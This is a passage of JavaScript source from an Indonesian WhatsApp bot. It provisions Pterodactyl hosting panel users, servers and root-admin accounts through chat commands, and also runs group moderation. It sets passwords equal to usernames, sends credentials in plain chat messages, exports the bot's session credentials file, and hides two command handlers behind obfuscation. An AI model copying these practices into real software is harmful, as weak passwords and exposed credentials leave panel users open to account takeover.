CPU: ${server.limits.cpu}%

`)

}

break
case "8gb": {
    if (!isPremium) return newReply(mess.prem)

let t = text.split(',');
if (t.length < 2) return newReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "8000"
let cpu = "85"
let disk = "0"
let email = username + "@nobita404.io"
akunlo = "https://i.top4top.io/p_2724da80p0.jpg" 
if (!u) return
let d = (await conn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta
}
})
newReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}
<-----INI ADALAH DATA AKUN MU----->

╭─❏ *『 USER INFO 』*
┣❏ ➤[USER ID: ${user.id}]
┣❏ ➤👤USERNAME: ${user.username}
┣❏ ➤🔐PASSWORD: ${password}
┣❏ ➤🌐LOGIN: ${domain}
┗⬣
© NobitaOfc
`
conn.sendMessage(u, {
    text: ctf,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BUATAN BOT",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await newReply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
USERNAME: ${user.username}
EMAIL: ${user.email}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "9gb": {
    if (!isPremium) return newReply(mess.prem)

let t = text.split(',');
if (t.length < 2) return newReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "9000"
let cpu = "95"
let disk = "0"
let email = username + "@nobita404.io"
akunlo = "https://i.top4top.io/p_2724da80p0.jpg" 
if (!u) return
let d = (await conn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta
}
})
newReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}
<-----INI ADALAH DATA AKUN MU----->

╭─❏ *『 USER INFO 』*
┣❏ ➤[USER ID: ${user.id}]
┣❏ ➤👤USERNAME: ${user.username}
┣❏ ➤🔐PASSWORD: ${password}
┣❏ ➤🌐LOGIN: ${domain}
┗⬣
© NobitaOfc
`
conn.sendMessage(u, {
    text: ctf,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BUATAN BOT",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await newReply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
USERNAME: ${user.username}
EMAIL: ${user.email}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "unli": {
    if (!isPremium) return newReply(mess.prem)
let t = text.split(',');
if (t.length < 2) return newReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "@nobita404.io"
akunlo = "https://i.top4top.io/p_2724da80p0.jpg" 
if (!u) return
let d = (await conn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta
}
})
newReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}
<-----INI ADALAH DATA AKUN MU----->

╭─❏ *『 USER INFO 』*
┣❏ ➤[USER ID: ${user.id}]
┣❏ ➤👤USERNAME: ${user.username}
┣❏ ➤🔐PASSWORD: ${password}
┣❏ ➤🌐LOGIN: ${domain}
┗⬣
© NobitaOfc
`
conn.sendMessage(u, {
    text: ctf,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyplta,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BUATAN BOT",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await newReply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
USERNAME: ${user.username}
EMAIL: ${user.email}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "createadmin": {
if (!isPremium) return newReply(mess.prem)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return newReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return newReply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return newReply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "019"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let adminpnl =`
*Hai ${nomornya}👋*
*INI ADALAH AKUN ADMIN PANEL MU*

*○ USERNAME :  ${username}*
*○ PASSWORD: ${password}*
*○ LOGIN: ${domain}
*CREATE AT ON: ${hariini}*
*S&K*
1. Jangan Mengotak Atik Panel
2. Jangan Digunakan Sampai Overload
3. Jangan Otak Atik Dibagian Nodes
4. Jangan Otak Atik Theme
6. Harap Tidak Membagikan Domain Panel!
7. Harap Tidak Menyolong Script/Hosting Orang Lain! Hargai Buyer Dhikzz
8. Harap Tidak Membuat Server Cpu Melebihi Dari 1K%+
9. Harap Tidak Membuat Panel Memory/Disk Lebih Dari 20GB!

*❗Segera Ganti Password Akun Panel Anda❗*
=====================================`
let f = await fetch(domain + "/api/application/users", {

"method": "POST",

"headers": {

"Accept": "application/json",

"Content-Type": "application/json",

"Authorization": "Bearer " + apikeyplta

},

"body": JSON.stringify({

"email": username + "@nobita404.io",

"username": username,

"first_name": username,

"last_name": "Memb",

"language": "en",

 "root_admin" : true,  

"password": password.toString()

})

})

let data = await f.json();

if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

return newReply(`
TYPE: user

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}

🖥️LOGIN: ${domain}`)
conn.sendMessage(nomornya, {
    text: adminpnl,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
    conn.sendMessage(nomornya, { audio: fs.readFileSync('./mp3/menu.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break
case "listsrv": {
  if (!isPremium) return newReply(mess.prem)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyplta
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await conn.sendMessage(m.chat, {
    text: messageText,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    newReply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
              case "listusr": {
  if (!isPremium) return newReply(mess.prem)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyplta
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await conn.sendMessage(m.chat, {
    text: messageText,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    newReply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
        case 'ambilcase':
            try{
                if (!isCreator) return newReply(mess.owner)
                if (!q) return newReply(`Example: ${prefix + command} antilink`)
                let nana = await getCase(q)
                newReply(nana)
            } catch(err){
            console.log(err)
            newReply(`Case ${q} tidak di temukan`)
        }
        break 
        case 'cekapikey':
            if (!isCreator) return newReply(mess.owner)
            let lol = await fetchJson(`https://api.lolhuman.xyz/api/checkapikey?apikey=${apikey}`)
            newReply(mess.wait)
            if (lol.message == 'success') {
                let ani = `• *ɴᴀᴍᴇ:* ${lol.result.username}
• *ᴛᴏᴛᴀʟ ʜɪᴛ:* ${lol.result.requests}
• *ʜɪᴛ ᴛᴏᴅᴀʏ:* ${lol.result.today}
• *ᴀᴄᴄᴏᴜɴᴛ:* ${lol.result.account_type}

• *ᴇxᴘɪʀᴇᴅ:* ${lol.result.expired}`
                conn.sendMessage(m.chat, { image: thumb, caption: ani }, { quoted: fkontak })
                } else newReply('ɪɴᴠᴀʟɪᴅ ᴀᴘɪᴋᴇʏ !')
            break
            
        case 'ambilsesi':
            if (!isCreator) return newReply(mess.owner)
            newReply('Tunggu Sebentar, Sedang mengambil file sesi mu')
            let sesi = await fs.readFileSync('./session/creds.json')
            conn.sendMessage(m.chat, { document: sesi, mimetype: 'application/json', fileName: 'creds.json' }, { quoted: m })
        break
        case 'autobio':
            if(!isCreator) return newReply(mess.owner)
            if (args.length < 1) return newReply(`Example ${prefix + command} on/off`)
            if (q == 'on'){
                global.db.data.settings[botNumber].autobio = true
                newReply(`Berhasil Mengubah AutoBio Ke ${q}`)
            } else if (q == 'off'){
                global.db.data.settings[botNumber].autobio = false
                newReply(`Berhasil Mengubah AutoBio Ke ${q}`)
            }
        break
        case 'autoread':
            if (!isCreator) return newReply(mess.owner)
            if (args.length < 1) return newReply(`Contoh ${prefix + command} on/off`)
            if (q === 'on'){
            global.db.data.settings[botNumber].autoread = true
            newReply(`Berhasil mengubah autoread ke ${q}`)
            } else if (q === 'off'){
            global.db.data.settings[botNumber].autoread = false
            newReply(`Berhasil mengubah autoread ke ${q}`)
            }
        break
        
        // Main Menu
        case 'afk': {
                let user = global.db.data.users[m.sender]
                user.afkTime = +new Date
                user.afkReason = text
                newReply(`💤 *${m.pushName}* Telah Afk${text ? ': ' + text : ''}`)
            }
            break
        case 'speedtest': {
                newReply('Testing Speed...')
                let cp = require('child_process')
                let {
                    promisify
                } = require('util')
                let exec = promisify(cp.exec).bind(cp)
                let o
                try {
                    o = await exec('python speed.py')
                } catch (e) {
                    o = e
                } finally {
                    let {
                        stdout,
                        stderr
                    } = o
                    if (stdout.trim()) newReply(stdout)
                    if (stderr.trim()) newReply(stderr)
                }
            }
        break
        case 'owner': 
        case 'creator':
                function _0x5ca7(){const _0x12f744=['TEL;type=MSG;type=CELL;type=VOICE;waid=','1455258XGRDbN','ORG:','BEGIN:VCARD\x0a','8glCARe','4Uzqwsv','2737098EYqbAV','6788187wCCBhV','26366AaJhZb','13XSwwdP','7943664guqOVl','7bWwjty','FN:','939415cowkZB','1175933EAkLmn','70nWsFEM'];_0x5ca7=function(){return _0x12f744;};return _0x5ca7();}const _0x2f4a42=_0x4670;function _0x4670(_0x177716,_0x1e9cb2){const _0x5ca7a2=_0x5ca7();return _0x4670=function(_0x46702d,_0xb3ce2f){_0x46702d=_0x46702d-0x103;let _0x21449b=_0x5ca7a2[_0x46702d];return _0x21449b;},_0x4670(_0x177716,_0x1e9cb2);}(function(_0x515640,_0x465970){const _0x171589=_0x4670,_0x11cc00=_0x515640();while(!![]){try{const _0x4dfac7=-parseInt(_0x171589(0x105))/0x1*(-parseInt(_0x171589(0x104))/0x2)+-parseInt(_0x171589(0x112))/0x3*(-parseInt(_0x171589(0x111))/0x4)+-parseInt(_0x171589(0x109))/0x5+-parseInt(_0x171589(0x10d))/0x6*(-parseInt(_0x171589(0x107))/0x7)+-parseInt(_0x171589(0x110))/0x8*(-parseInt(_0x171589(0x103))/0x9)+parseInt(_0x171589(0x10b))/0xa*(-parseInt(_0x171589(0x10a))/0xb)+-parseInt(_0x171589(0x106))/0xc;if(_0x4dfac7===_0x465970)break;else _0x11cc00['push'](_0x11cc00['shift']());}catch(_0x2c2891){_0x11cc00['push'](_0x11cc00['shift']());}}}(_0x5ca7,0x75c33));const vcard=_0x2f4a42(0x10f)+(_0x2f4a42(0x108)+namaowner+'\x0a')+(_0x2f4a42(0x10e)+namabot+';\x0a')+(_0x2f4a42(0x10c)+owner+':+'+nomerowner+'\x0a')+'END:VCARD';conn['sendMessage'](m['chat'],{'contacts':{'displayName':namaowner,'contacts':[{'vcard':vcard}]}},{'quoted':fkontak});
        break
        case 'ceklimit': 
        case 'checklimit': 
        case 'limit':{
					newReply('Your Limit: ' + (db.data.users[m.sender].limit))
					}
	    break
        case 'runtime':
            	newReply(`The bot has been active for a long time\n*${runtime(process.uptime())}*`)
        break

case 'sc': case 'script': case 'donate': case 'donate': case 'cekupdate': case 'updatebot': case 'cekbot': case 'sourcecode':
newReply(`*「  ɴᴏʙɪᴛᴀ-ᴍᴅ ꜱᴄʀɪᴘᴛ  」*\n\n*MINTA OWNER YA*\n\n*Dont forget to donate yeah* 🍜 `)
        break
        
        case 'totalfitur':
        case 'fitur': 
            newReply(`Total Bot Features Are ${totalFitur()}`)
        break
        case 'ping': {
            const used = process.memoryUsage()
            let timestamp = speed()
            let latensi = speed() - timestamp
            let neww = performance.now()
            let oldd = performance.now()
            let respon = `Kecepatan Respon ${latensi.toFixed(4)} _Second_ 

_Info Server_
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
`.trim()
conn.relayMessage(m.chat, { liveLocationMessage: { 
degreesLatitude: 35.676570,
degreesLongitude: 139.762148,
caption: respon,
sequenceNumber: 1656662972682001, timeOffset: 8600, jpegThumbnail: fs.readFileSync('./media/koneko.jpg'),
contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
showAdAttribution: false,
}
}
}} , { quoted: m })
        }
        break
        // Group Fitur
            case 'kick': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'add': {
                if (!isPremium && !isCreator) return newReply('*Lu Siapa Tod? Fitur Ini Khusus Owner! Mau Akses? Beli Prem Lah Anj 😤*')
                let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'promote': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'demote': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'block': {
                if (!isCreator) return newReply(mess.owner)
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.updateBlockStatus(users, 'block').then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'unblock': {
                if (!isCreator) return newReply(mess.owner)
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.updateBlockStatus(users, 'unblock').then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'setname':
            case 'setsubject': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                if (!text) return 'Text ?'
                await conn.groupUpdateSubject(m.chat, text).then((res) => newReply(mess.success)).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'setdesc':
            case 'setdesk': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                if (!text) return 'Text ?'
                await conn.groupUpdateDescription(m.chat, text).then((res) => newReply(mess.success)).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc': {
                var _0x50f3e3=_0xe209;(function(_0x3539fb,_0x221968){var _0x415b38=_0xe209,_0x1a0146=_0x3539fb();while(!![]){try{var _0x33922b=parseInt(_0x415b38(0x145))/0x1+parseInt(_0x415b38(0x147))/0x2+parseInt(_0x415b38(0x139))/0x3+parseInt(_0x415b38(0x141))/0x4*(-parseInt(_0x415b38(0x149))/0x5)+parseInt(_0x415b38(0x142))/0x6+-parseInt(_0x415b38(0x138))/0x7*(-parseInt(_0x415b38(0x148))/0x8)+-parseInt(_0x415b38(0x13d))/0x9;if(_0x33922b===_0x221968)break;else _0x1a0146['push'](_0x1a0146['shift']());}catch(_0x4c32cd){_0x1a0146['push'](_0x1a0146['shift']());}}}(_0x2f45,0x93c7b));if(!m[_0x50f3e3(0x14b)])return newReply(mess[_0x50f3e3(0x140)]);if(!isAdmins)return newReply(mess[_0x50f3e3(0x137)]);if(!isBotAdmins)return newReply(mess[_0x50f3e3(0x13e)]);if(!quoted)return newReply(_0x50f3e3(0x136)+(prefix+command));function _0xe209(_0x5361ca,_0x167954){var _0x2f45c1=_0x2f45();return _0xe209=function(_0xe2090e,_0x24b7f4){_0xe2090e=_0xe2090e-0x134;var _0x413c4e=_0x2f45c1[_0xe2090e];return _0x413c4e;},_0xe209(_0x5361ca,_0x167954);}if(!/image/['test'](mime))return newReply(_0x50f3e3(0x136)+(prefix+command));if(/webp/[_0x50f3e3(0x144)](mime))return newReply(_0x50f3e3(0x136)+(prefix+command));function _0x2f45(){var _0x252d0e=['ppgc.jpeg','group','345784EEjJTC','1033890GLprrW','set','test','341680uqcEBF','w:profile:picture','485944EDvvyC','1423832edNMDP','35kvgXDy','image','isGroup','Sukses','chat','/panjang','Kirim/Reply\x20Image\x20Dengan\x20Caption\x20','admin','28vPLIjh','1974081GvpIHd','query','downloadAndSaveMediaMessage','unlinkSync','8248329EDjAsi','botAdmin'];_0x2f45=function(){return _0x252d0e;};return _0x2f45();}var mediz=await conn[_0x50f3e3(0x13b)](quoted,_0x50f3e3(0x13f));if(args[0x0]==_0x50f3e3(0x135)){var {img}=await generateProfilePicture(mediz);await conn[_0x50f3e3(0x13a)]({'tag':'iq','attrs':{'to':m[_0x50f3e3(0x134)],'type':_0x50f3e3(0x143),'xmlns':_0x50f3e3(0x146)},'content':[{'tag':'picture','attrs':{'type':_0x50f3e3(0x14a)},'content':img}]}),fs[_0x50f3e3(0x13c)](mediz),reply('Sukses');}else{var memeg=await conn['updateProfilePicture'](m[_0x50f3e3(0x134)],{'url':mediz});fs['unlinkSync'](mediz),reply(_0x50f3e3(0x14c));}
            }
            break
            case 'tagall': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                let teks = `*👥 Tag All By Admin*
 
                 🗞️ *Pesan : ${q ? q : 'kosong'}*\n\n`
                for (let mem of participants) {
                    teks += `• @${mem.id.split('@')[0]}\n`
                }
                conn.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            }
            break
            case 'hidetag': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Kan Aku Belum Jadi Admin 🥲`)
                conn.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            }
            break
            case 'totag': {
               if (!m.isGroup) return newReply(mess.group)
               if (!isBotAdmins) return newReply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
               if (!isAdmins) return newReply(mess.admin)
               if (!m.quoted) return `Reply pesan dengan caption ${prefix + command}`
               conn.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break
            case 'antilink': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antilink) return newReply(`Sudah Aktif Sebelumnya 🕊️`)
                    db.data.chats[m.chat].antilink = true
